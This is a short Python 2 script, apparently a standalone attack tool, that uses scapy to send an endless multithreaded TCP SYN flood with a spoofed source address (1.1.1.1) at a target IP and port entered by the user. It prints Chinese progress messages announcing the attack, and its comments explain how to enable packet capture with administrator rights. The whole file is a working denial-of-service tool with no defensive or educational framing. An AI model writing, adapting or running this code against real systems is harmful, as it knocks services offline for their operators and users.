#coding:utf-8
from scapy.all import *
import threading
import random

#如果报错,可能原因需要开启网络抓包服务，管理员权限打开cmd，输入net start npf
#解决：from scapy.all import *;ifaces 查看接口是否启用

def Syn_flood(target_ip, target_port):
	num=1
 	while True:
 		port = random.randint(0,65535)
 		send(IP(src="1.1.1.1", dst=target_ip)/TCP(dport=target_port, sport=port),verbose=0)
		print u">>>>>syn攻击中--第%d次"%num
		num+=1
 		#send(IP(dst=target_ip)/TCP(dport=target_port, sport=port),verbose=0)
def main(target_ip, target_port, threads):
	print "BEGIN TO ATTACK TARGET"
	for i in range(0, threads):
		
		t = threading.Thread(target=Syn_flood, args=(target_ip, target_port))
		t.start()
if __name__== "__main__": 
	target_ip = raw_input("Please input the target_ip: ")
	target_port = int(raw_input("Please input the target_port: "))
	threads = int(raw_input("Please input the threads: "))
	main(target_ip, target_port, threads)